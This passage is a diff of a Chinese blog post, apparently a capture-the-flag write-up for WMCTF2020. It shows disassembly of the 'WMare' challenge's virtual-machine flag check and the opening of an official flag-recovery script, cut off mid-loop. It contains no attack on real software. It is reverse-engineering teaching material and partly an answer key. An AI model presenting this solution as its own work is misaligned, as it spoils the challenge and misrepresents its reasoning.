@@ -17,13 +17,13 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>WMCTF2020 RE Wmare | Ld1ng</title>
-  <meta name="description" content="0x00 前言好久没写博客了，最近比赛比较多，又没做出什么题，（pwn是真的不会） 这里就水一篇记录一下这道肝疼的RE题。 好一个虚拟机！这道题断断续续看了两三天…首先感谢我炜哥的耐心指导，从程序都不会启动到摸清整个程序的脉络，全靠炜哥一把屎一把尿….  咳咳进入正题  0x01 传送门炜哥博客里记录的很详细，从启动到手撕一气呵成&#x2F;滑稽脸，我就不再赘述了。 点击传送门直接开启新世界。  0x02">
+  <title>WMCTF2020 | Ld1ng</title>
+  <meta name="description" content="0x00 前言最近比赛比较多，又没做出什么题，只能赛后复现一下 这里主要水一篇记录两道题WMare(re)和mengyedekending(pwn) 0x01 WMare好一个虚拟机！这道题断断续续看了两三天…首先感谢我炜哥的耐心指导，从程序都不会启动到摸清整个程序的脉络，全靠炜哥一把屎一把尿….  咳咳进入正题  0x02 传送门炜哥博客里记录的很详细，从启动到手撕一气呵成&#x2F;滑稽脸，我就不再赘述">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WMCTF2020 RE Wmare">
-<meta property="og:url" content="http://ld1ng.com/2020/08/05/WMare/index.html">
+<meta property="og:title" content="WMCTF2020">
+<meta property="og:url" content="http://ld1ng.com/2020/08/05/WMCTF/index.html">
 <meta property="og:site_name" content="Ld1ng">
-<meta property="og:description" content="0x00 前言好久没写博客了，最近比赛比较多，又没做出什么题，（pwn是真的不会） 这里就水一篇记录一下这道肝疼的RE题。 好一个虚拟机！这道题断断续续看了两三天…首先感谢我炜哥的耐心指导，从程序都不会启动到摸清整个程序的脉络，全靠炜哥一把屎一把尿….  咳咳进入正题  0x01 传送门炜哥博客里记录的很详细，从启动到手撕一气呵成&#x2F;滑稽脸，我就不再赘述了。 点击传送门直接开启新世界。  0x02">
+<meta property="og:description" content="0x00 前言最近比赛比较多，又没做出什么题，只能赛后复现一下 这里主要水一篇记录两道题WMare(re)和mengyedekending(pwn) 0x01 WMare好一个虚拟机！这道题断断续续看了两三天…首先感谢我炜哥的耐心指导，从程序都不会启动到摸清整个程序的脉络，全靠炜哥一把屎一把尿….  咳咳进入正题  0x02 传送门炜哥博客里记录的很详细，从启动到手撕一气呵成&#x2F;滑稽脸，我就不再赘述">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://i.loli.net/2020/08/05/CHvORtU94N8hpKj.png">
 <meta property="og:image" content="https://i.loli.net/2020/08/05/PkWFHLha5jui8gU.png">
@@ -31,15 +31,21 @@
 <meta property="og:image" content="https://i.loli.net/2020/08/05/9dzXOYig1WmrEJL.png">
 <meta property="og:image" content="https://i.loli.net/2020/08/05/nRQHUTb6AIOPVWG.png">
 <meta property="og:image" content="https://i.loli.net/2020/08/05/E2LPbZ5q68ltArf.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/3qGKAzEmVytMucQ.png">
+<meta property="og:image" content="https://n0nop.com/img/image-20200803094211088.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/Op35ZHshlN1tk86.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/S2mAMz3L9WFnKhZ.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/dyKL8Ef6NPCmHut.png">
+<meta property="og:image" content="https://i.loli.net/2020/08/06/EfSHcGaAC6TvqNP.png">
 <meta property="article:published_time" content="2020-08-04T16:00:00.000Z">
-<meta property="article:modified_time" content="2020-08-05T07:50:58.529Z">
+<meta property="article:modified_time" content="2020-08-06T14:21:14.426Z">
 <meta property="article:author" content="Ld1ng">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="ADWorld">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://i.loli.net/2020/08/05/CHvORtU94N8hpKj.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="http://ld1ng.com/2020/08/05/WMare/index.html">
+  <link rel="canonical" href="http://ld1ng.com/2020/08/05/WMCTF/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Ld1ng" type="application/atom+xml">
   
@@ -251,7 +257,7 @@
   <div class="widget">
     <h3 class="widget-title">Archive</h3>
     <div class="widget-body">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">4</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">4</span></li></ul>
     </div>
   </div>
 
@@ -276,7 +282,32 @@
           <li>
             
             <div class="item-thumb">
-              <a href="/2020/08/05/WMare/" class="thumb">
+              <a href="/2020/08/06/Untitled/" class="thumb">
+    
+    
+        <span class="thumb-image thumb-none"></span>
+    
+</a>
+
+            </div>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/08/06/Untitled/" class="title">Untitled</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-08-06T08:36:29.621Z" itemprop="datePublished">2020-08-06</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-thumb">
+              <a href="/2020/08/05/WMCTF/" class="thumb">
     
     
         <span class="thumb-image thumb-none"></span>
@@ -290,7 +321,7 @@
                 <a class="category-link" href="/categories/REVERSE/">REVERSE</a>
               </p>
               <p class="item-title">
-                <a href="/2020/08/05/WMare/" class="title">WMCTF2020 RE Wmare</a>
+                <a href="/2020/08/05/WMCTF/" class="title">WMCTF2020</a>
               </p>
               <p class="item-date">
                 <time datetime="2020-08-04T16:00:00.000Z" itemprop="datePublished">2020-08-05</time>
@@ -373,31 +404,6 @@
             </div>
           </li>
           
-          <li>
-            
-            <div class="item-thumb">
-              <a href="/2020/06/20/Graduation/" class="thumb">
-    
-    
-        <span class="thumb-image thumb-none"></span>
-    
-</a>
-
-            </div>
-            
-            <div class="item-inner">
-              <p class="item-category">
-                <a class="category-link" href="/categories/LIFE/">LIFE</a>
-              </p>
-              <p class="item-title">
-                <a href="/2020/06/20/Graduation/" class="title">观毕业季有感</a>
-              </p>
-              <p class="item-date">
-                <time datetime="2020-06-19T16:00:00.000Z" itemprop="datePublished">2020-06-20</time>
-              </p>
-            </div>
-          </li>
-          
       </ul>
     </div>
   </div>
@@ -413,21 +419,21 @@
   <div class="slimContent">
     <nav id="toc" class="article-toc">
       <h3 class="toc-title">Catalogue</h3>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-传送门"><span class="toc-number">2.</span> <span class="toc-text">0x01 传送门</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-遇到的问题"><span class="toc-number">3.</span> <span class="toc-text">0x02 遇到的问题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-小结"><span class="toc-number">4.</span> <span class="toc-text">0x03 小结</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-WMare"><span class="toc-number">2.</span> <span class="toc-text">0x01 WMare</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-传送门"><span class="toc-number">2.1.</span> <span class="toc-text">0x02 传送门</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-遇到的问题"><span class="toc-number">2.2.</span> <span class="toc-text">0x03 遇到的问题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-mengyedekending"><span class="toc-number">3.</span> <span class="toc-text">0x04 mengyedekending</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-exp"><span class="toc-number">3.1.</span> <span class="toc-text">0x05 exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-小结"><span class="toc-number">4.</span> <span class="toc-text">0x06 小结</span></a></li></ol>
     </nav>
   </div>
 </aside>
 
 <main class="main" role="main">
   <div class="content">
-  <article id="post-WMare" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-WMCTF" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      WMCTF2020 RE Wmare
+      WMCTF2020
     </h1>
   
 
@@ -435,7 +441,7 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2020/08/05/WMare/" class="article-date">
+	<a href="/2020/08/05/WMCTF/" class="article-date">
 	  <time datetime="2020-08-04T16:00:00.000Z" itemprop="datePublished">2020-08-05</time>
 	</a>
 </span>
@@ -461,33 +467,33 @@
 	</span>
 
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/08/05/WMare/#comments" class="article-comment-link">Comments</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/08/05/WMCTF/#comments" class="article-comment-link">Comments</a></span>
         
 	
-		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 1.7k(words)</span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 2.8k(words)</span>
 	
 	
-		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 7(minutes)</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 13(minutes)</span>
 	
 
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>好久没写博客了，最近比赛比较多，又没做出什么题，（pwn是真的不会）</p>
-<p>这里就<del>水一篇</del>记录一下这道肝疼的RE题。</p>
-<p>好一个虚拟机！这道题断断续续看了两三天…首先感谢我<a href="https://ljzjsc.com/" target="_blank" rel="noopener">炜哥</a>的耐心指导，从程序都不会启动到摸清整个程序的脉络，全靠炜哥一把屎一把尿…. </p>
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近比赛比较多，又没做出什么题，只能赛后复现一下</p>
+<p>这里主要<del>水一篇</del>记录两道题<strong>WMare</strong>(re)和<strong>mengyedekending</strong>(pwn)</p>
+<h1 id="0x01-WMare"><a href="#0x01-WMare" class="headerlink" title="0x01 WMare"></a>0x01 WMare</h1><p>好一个虚拟机！这道题断断续续看了两三天…首先感谢我<a href="https://ljzjsc.com/" target="_blank" rel="noopener">炜哥</a>的耐心指导，从程序都不会启动到摸清整个程序的脉络，全靠炜哥一把屎一把尿…. </p>
 <p>咳咳进入正题</p>
 <hr>
-<h1 id="0x01-传送门"><a href="#0x01-传送门" class="headerlink" title="0x01 传送门"></a>0x01 <a href="https://ljzjsc.com/index.php/archives/69/" target="_blank" rel="noopener">传送门</a></h1><p>炜哥博客里记录的很详细，从启动到手撕一气呵成/滑稽脸，我就不再赘述了。</p>
+<h2 id="0x02-传送门"><a href="#0x02-传送门" class="headerlink" title="0x02 传送门"></a>0x02 <a href="https://ljzjsc.com/index.php/archives/69/" target="_blank" rel="noopener">传送门</a></h2><p>炜哥博客里记录的很详细，从启动到手撕一气呵成/滑稽脸，我就不再赘述了。</p>
 <p>点击传送门直接开启新世界。</p>
 <hr>
-<h1 id="0x02-遇到的问题"><a href="#0x02-遇到的问题" class="headerlink" title="0x02 遇到的问题"></a>0x02 遇到的问题</h1><p>我只简单地记录一下我在调试时遇到的问题。</p>
+<h2 id="0x03-遇到的问题"><a href="#0x03-遇到的问题" class="headerlink" title="0x03 遇到的问题"></a>0x03 遇到的问题</h2><p>我只简单地记录一下我在调试时遇到的问题。</p>
 <p>从一开始找到<code>WELCOME TO WMCTF! INPUT:</code>以及输入函数都没太大问题，关键还是在于最后的校验函数。</p>
 <p>我先拷一下校验的汇编：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">0000000000006000: (                   ): jmp .+0 (0x00006002)      ; eb00</span><br><span class="line">0000000000006002: (                   ): xor ecx, ecx              ; 31c9</span><br><span class="line">0000000000006004: (                   ): cmp ecx, 0x00000081       ; 81f981000000</span><br><span class="line">000000000000600a: (                   ): jz .+226 (0x000060f2)     ; 0f84e2000000</span><br><span class="line">0000000000006010: (                   ): xor esi, esi              ; 31f6</span><br><span class="line">0000000000006012: (                   ): cmp esi, 0x00000009       ; 83fe09</span><br><span class="line">0000000000006015: (                   ): jz .+209 (0x000060ec)     ; 0f84d1000000</span><br><span class="line">000000000000601b: (                   ): xor edx, edx              ; 31d2</span><br><span class="line">000000000000601d: (                   ): mov eax, esi              ; 89f0</span><br><span class="line">000000000000601f: (                   ): inc eax                   ; 40</span><br><span class="line">0000000000006020: (                   ): mov ebx, 0x00000009       ; bb09000000</span><br><span class="line">0000000000006025: (                   ): div eax, ebx              ; f7f3</span><br><span class="line">0000000000006027: (                   ): mov edi, edx              ; 89d7</span><br><span class="line">0000000000006029: (                   ): xor edx, edx              ; 31d2</span><br><span class="line">000000000000602b: (                   ): mov eax, ecx              ; 89c8</span><br><span class="line">000000000000602d: (                   ): mov ebx, 0x00000003       ; bb03000000</span><br><span class="line">0000000000006032: (                   ): div eax, ebx              ; f7f3</span><br><span class="line">0000000000006034: (                   ): jz .+5 (0x0000603b)       ; 7405</span><br><span class="line">0000000000006036: (                   ): jnz .+3 (0x0000603b)      ; 7503</span><br><span class="line">0000000000006038: (                   ): ret 0x0099                ; c29900</span><br><span class="line">000000000000603b: (                   ): cmp edx, 0x00000000       ; 83fa00</span><br><span class="line">000000000000603e: (                   ): jz .+7 (0x00006047)       ; 7407</span><br><span class="line">0000000000006040: (                   ): cmp edx, 0x00000001       ; 83fa01</span><br><span class="line">0000000000006043: (                   ): jz .+56 (0x0000607d)      ; 7438</span><br><span class="line">0000000000006045: (                   ): jnz .+108 (0x000060b3)    ; 756c</span><br><span class="line">0000000000006047: (                   ): shl esi, 0x02             ; c1e602</span><br><span class="line">000000000000604a: (                   ): mov eax, dword ptr ds:[esi] ; 3e8b06</span><br><span class="line">000000000000604d: (                   ): shl edi, 0x02             ; c1e702</span><br><span class="line">0000000000006050: (                   ): mov ebx, dword ptr ds:[edi] ; 3e8b1f</span><br><span class="line">0000000000006053: (                   ): mov edx, eax              ; 89c2</span><br><span class="line">0000000000006055: (                   ): mov edi, ebx              ; 89df</span><br><span class="line">0000000000006057: (                   ): or eax, ebx               ; 09d8</span><br><span class="line">0000000000006059: (                   ): not edx                   ; f7d2</span><br><span class="line">000000000000605b: (                   ): not edi                   ; f7d7</span><br><span class="line">000000000000605d: (                   ): or edx, edi               ; 09fa</span><br><span class="line">000000000000605f: (                   ): and eax, edx              ; 21d0</span><br><span class="line">0000000000006061: (                   ): mov edx, eax              ; 89c2</span><br><span class="line">0000000000006063: (                   ): mov ebx, 0x24114514       ; bb14451124</span><br><span class="line">0000000000006068: (                   ): mov edi, ebx              ; 89df</span><br><span class="line">000000000000606a: (                   ): not eax                   ; f7d0</span><br><span class="line">000000000000606c: (                   ): not ebx                   ; f7d3</span><br><span class="line">000000000000606e: (                   ): and eax, ebx              ; 21d8</span><br><span class="line">0000000000006070: (                   ): not eax                   ; f7d0</span><br><span class="line">0000000000006072: (                   ): and edx, edi              ; 21fa</span><br><span class="line">0000000000006074: (                   ): not edx                   ; f7d2</span><br><span class="line">0000000000006076: (                   ): and eax, edx              ; 21d0</span><br><span class="line">0000000000006078: (                   ): mov dword ptr ds:[esi], eax ; 3e8906</span><br><span class="line">000000000000607b: (                   ): jmp .+102 (0x000060e3)    ; eb66</span><br><span class="line">000000000000607d: (                   ): shl esi, 0x02             ; c1e602</span><br><span class="line">0000000000006080: (                   ): mov eax, dword ptr ds:[esi] ; 3e8b06</span><br><span class="line">0000000000006083: (                   ): shl edi, 0x02             ; c1e702</span><br><span class="line">0000000000006086: (                   ): mov ebx, dword ptr ds:[edi] ; 3e8b1f</span><br><span class="line">0000000000006089: (                   ): mov edx, eax              ; 89c2</span><br><span class="line">000000000000608b: (                   ): mov edi, ebx              ; 89df</span><br><span class="line">000000000000608d: (                   ): not eax                   ; f7d0</span><br><span class="line">000000000000608f: (                   ): not ebx                   ; f7d3</span><br><span class="line">0000000000006091: (                   ): and eax, ebx              ; 21d8</span><br><span class="line">0000000000006093: (                   ): not eax                   ; f7d0</span><br><span class="line">0000000000006095: (                   ): and edx, edi              ; 21fa</span><br><span class="line">0000000000006097: (                   ): not edx                   ; f7d2</span><br><span class="line">0000000000006099: (                   ): and eax, edx              ; 21d0</span><br><span class="line">000000000000609b: (                   ): mov edx, eax              ; 89c2</span><br><span class="line">000000000000609d: (                   ): mov ebx, 0x01919810       ; bb10989101</span><br><span class="line">00000000000060a2: (                   ): mov edi, ebx              ; 89df</span><br><span class="line">00000000000060a4: (                   ): not ebx                   ; f7d3</span><br><span class="line">00000000000060a6: (                   ): and eax, ebx              ; 21d8</span><br><span class="line">00000000000060a8: (                   ): not edx                   ; f7d2</span><br><span class="line">00000000000060aa: (                   ): and edx, edi              ; 21fa</span><br><span class="line">00000000000060ac: (                   ): or eax, edx               ; 09d0</span><br><span class="line">00000000000060ae: (                   ): mov dword ptr ds:[esi], eax ; 3e8906</span><br><span class="line">00000000000060b1: (                   ): jmp .+48 (0x000060e3)     ; eb30</span><br><span class="line">00000000000060b3: (                   ): shl esi, 0x02             ; c1e602</span><br><span class="line">00000000000060b6: (                   ): mov eax, dword ptr ds:[esi] ; 3e8b06</span><br><span class="line">00000000000060b9: (                   ): shl edi, 0x02             ; c1e702</span><br><span class="line">00000000000060bc: (                   ): mov ebx, dword ptr ds:[edi] ; 3e8b1f</span><br><span class="line">00000000000060bf: (                   ): mov edx, eax              ; 89c2</span><br><span class="line">00000000000060c1: (                   ): mov edi, ebx              ; 89df</span><br><span class="line">00000000000060c3: (                   ): not ebx                   ; f7d3</span><br><span class="line">00000000000060c5: (                   ): and eax, ebx              ; 21d8</span><br><span class="line">00000000000060c7: (                   ): not edx                   ; f7d2</span><br><span class="line">00000000000060c9: (                   ): and edx, edi              ; 21fa</span><br><span class="line">00000000000060cb: (                   ): or eax, edx               ; 09d0</span><br><span class="line">00000000000060cd: (                   ): mov edx, eax              ; 89c2</span><br><span class="line">00000000000060cf: (                   ): mov ebx, 0x19260817       ; bb17082619</span><br><span class="line">00000000000060d4: (                   ): mov edi, ebx              ; 89df</span><br><span class="line">00000000000060d6: (                   ): or eax, ebx               ; 09d8</span><br><span class="line">00000000000060d8: (                   ): not edx                   ; f7d2</span><br><span class="line">00000000000060da: (                   ): not edi                   ; f7d7</span><br><span class="line">00000000000060dc: (                   ): or edx, edi               ; 09fa</span><br><span class="line">00000000000060de: (                   ): and eax, edx              ; 21d0</span><br><span class="line">00000000000060e0: (                   ): mov dword ptr ds:[esi], eax ; 3e8906</span><br><span class="line">00000000000060e3: (                   ): shr esi, 0x02             ; c1ee02</span><br><span class="line">00000000000060e6: (                   ): inc esi                   ; 46</span><br><span class="line">00000000000060e7: (                   ): jmp .-218 (0x00006012)    ; e926ffffff</span><br><span class="line">00000000000060ec: (                   ): inc ecx                   ; 41</span><br><span class="line">00000000000060ed: (                   ): jmp .-238 (0x00006004)    ; e912ffffff</span><br><span class="line">00000000000060f2: (                   ): xor ecx, ecx              ; 31c9</span><br><span class="line">00000000000060f4: (                   ): xor edx, edx              ; 31d2</span><br><span class="line">00000000000060f6: (                   ): cmp ecx, 0x00000012       ; 83f912</span><br><span class="line">00000000000060f9: (                   ): jz .+25 (0x00006114)      ; 7419</span><br><span class="line">00000000000060fb: (                   ): shl ecx, 0x01             ; d1e1</span><br><span class="line">00000000000060fd: (                   ): mov ax, word ptr ds:[ecx-19092685] ; 3e668b8133abdcfe</span><br><span class="line">0000000000006105: (                   ): mov bx, word ptr ds:[ecx] ; 3e668b19</span><br><span class="line">0000000000006109: (                   ): cmp ax, bx                ; 6639d8</span><br><span class="line">000000000000610c: (                   ): jz .+1 (0x0000610f)       ; 7401</span><br><span class="line">000000000000610e: (                   ): inc edx                   ; 42</span><br><span class="line">000000000000610f: (                   ): shr ecx, 0x01             ; d1e9</span><br><span class="line">0000000000006111: (                   ): inc ecx                   ; 41</span><br><span class="line">0000000000006112: (                   ): jmp .-30 (0x000060f6)     ; ebe2</span><br><span class="line">0000000000006114: (                   ): cmp edx, 0x00000000       ; 83fa00</span><br><span class="line">0000000000006117: (                   ): jnz .+98 (0x0000617b)     ; 7562</span><br><span class="line">0000000000006119: (                   ): mov byte ptr gs:0x00000320, 0x41 ; 65c6052003000041</span><br><span class="line">0000000000006121: (                   ): mov byte ptr gs:0x00000321, 0x02 ; 65c6052103000002</span><br><span class="line">0000000000006129: (                   ): mov byte ptr gs:0x00000322, 0x63 ; 65c6052203000063</span><br><span class="line">0000000000006131: (                   ): mov byte ptr gs:0x00000323, 0x02 ; 65c6052303000002</span><br><span class="line">0000000000006139: (                   ): mov byte ptr gs:0x00000324, 0x63 ; 65c6052403000063</span><br><span class="line">0000000000006141: (                   ): mov byte ptr gs:0x00000325, 0x02 ; 65c6052503000002</span><br><span class="line">0000000000006149: (                   ): mov byte ptr gs:0x00000326, 0x65 ; 65c6052603000065</span><br><span class="line">0000000000006151: (                   ): mov byte ptr gs:0x00000327, 0x02 ; 65c6052703000002</span><br><span class="line">0000000000006159: (                   ): mov byte ptr gs:0x00000328, 0x73 ; 65c6052803000073</span><br><span class="line">0000000000006161: (                   ): mov byte ptr gs:0x00000329, 0x02 ; 65c605290300000</span><br><span class="line">0000000000006169: (                   ): mov byte ptr gs:0x0000032a, 0x73 ; 65c6052a03000073</span><br><span class="line">0000000000006171: (                   ): mov byte ptr gs:0x0000032b, 0x02 ; 65c6052b03000002</span><br><span class="line">0000000000006179: (                   ): jmp .+64 (0x000061bb)     ; eb40</span><br><span class="line">000000000000617b: (                   ): mov byte ptr gs:0x00000320, 0x46 ; 65c6052003000046</span><br><span class="line">0000000000006183: (                   ): mov byte ptr gs:0x00000321, 0x04 ; 65c6052103000004</span><br><span class="line">000000000000618b: (                   ): mov byte ptr gs:0x00000322, 0x61 ; 65c6052203000061</span><br><span class="line">0000000000006193: (                   ): mov byte ptr gs:0x00000323, 0x04 ; 65c6052303000004</span><br><span class="line">000000000000619b: (                   ): mov byte ptr gs:0x00000324, 0x69 ; 65c6052403000069</span><br><span class="line">00000000000061a3: (                   ): mov byte ptr gs:0x00000325, 0x04 ; 65c6052503000004</span><br><span class="line">00000000000061ab: (                   ): mov byte ptr gs:0x00000326, 0x6c ; 65c605260300006c</span><br><span class="line">00000000000061b3: (                   ): mov byte ptr gs:0x00000327, 0x04 ; 65c6052703000004</span><br><span class="line">00000000000061bb: (                   ): jmp .-2 (0x000061bb)      ; ebfe</span><br></pre></td></tr></table></figure>
 
-<p>代码很长，不过48小时的比赛慢慢看呗…</p>
+<p>代码很长，</p>
 <p>最后的全局段内存处分别是ACCESS和FAIL，即数据校验成功与否。</p>
 <p>接着分析上面代码即可，一点一点动调可以摸出大体逻辑：</p>
 <p>第一层大循环0x81/3次，内部进行3次小循环（每个循环9次），对数据进行加密</p>
@@ -528,10 +534,41 @@
 </blockquote>
 <p>所以，全部明白之后，题目就迎刃而解了。</p>
 <p>至于加密方法是三个数据异或，这是我没有想到的…</p>
-<h1 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h1><p>出题人是魔鬼，我复现了一遍才体会到了炜哥的艰辛，tql</p>
+<p>放上上<strong>官方exp</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">enc_flag = [<span class="number">0xec5574d8</span>,<span class="number">0x421a04b5</span>,<span class="number">0x2ba6d11</span>,<span class="number">0x8105055f</span>,<span class="number">0xeda06c28</span>,<span class="number">0x6ae00499</span>,<span class="number">0x18a955e7</span>,<span class="number">0x71d63591</span>,<span class="number">0x4537a864</span>] </span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">128</span>,<span class="number">-1</span>,<span class="number">-1</span>):               <span class="comment">#129轮逻辑运算 </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>,<span class="number">-1</span>,<span class="number">-1</span>):           <span class="comment">#臭死力 </span></span><br><span class="line">        <span class="keyword">if</span> (n%<span class="number">3</span> == <span class="number">0</span>): </span><br><span class="line">  